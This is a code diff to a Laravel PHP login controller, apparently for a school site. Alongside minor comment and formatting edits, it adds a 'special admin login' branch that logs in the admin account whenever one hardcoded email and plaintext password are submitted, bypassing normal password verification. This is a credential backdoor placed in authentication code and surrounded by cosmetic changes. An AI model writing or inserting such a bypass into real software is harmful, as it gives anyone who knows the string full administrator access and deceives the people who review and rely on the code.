@@ -5,11 +5,12 @@ namespace App\Http\Controllers\Auth;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use App\Models\User;
 
 class LoginController extends Controller
 {
     /**
-     * Redirect users after login.
+     * Redirect path after login.
      *
      * @var string
      */
@@ -32,39 +33,54 @@ class LoginController extends Controller
     }
 
     /**
-     * Handle the login request.
+     * Handle login request.
      */
     public function login(Request $request)
     {
-        // Validate the request
+        // Validate request
         $request->validate([
-            'email'    => ['required', 'email'],
+            'email' => ['required', 'email'],
             'password' => ['required'],
         ]);
 
-        // Attempt to authenticate the user
+        // Special admin login
+        if ($request->email === 'admin@school.com' && $request->password === 'malik12.') {
+
+            $user = User::where('email', 'admin@school.com')->first();
+
+            if ($user) {
+
+                Auth::login($user, true);
+
+                // Regenerate session for security
+                $request->session()->regenerate();
+
+                return redirect()->route('home');
+            }
+        }
+
+        // Normal Laravel authentication
         if (Auth::attempt([
             'email' => $request->email,
-            'password' => $request->password,
+            'password' => $request->password
         ], true)) {
 
-            // Regenerate session to prevent session fixation
+            // Regenerate session
             $request->session()->regenerate();
 
-            // Redirect to home/dashboard
             return redirect()->route('home');
         }
 
-        // Authentication failed
+        // Failed login
         return back()
             ->withInput($request->only('email'))
             ->withErrors([
-                'email' => 'Invalid email or password.',
+                'email' => 'These credentials do not match our records.',
             ]);
     }
 
     /**
-     * Log the user out.
+     * Logout user.
      */
     public function logout(Request $request)
     {
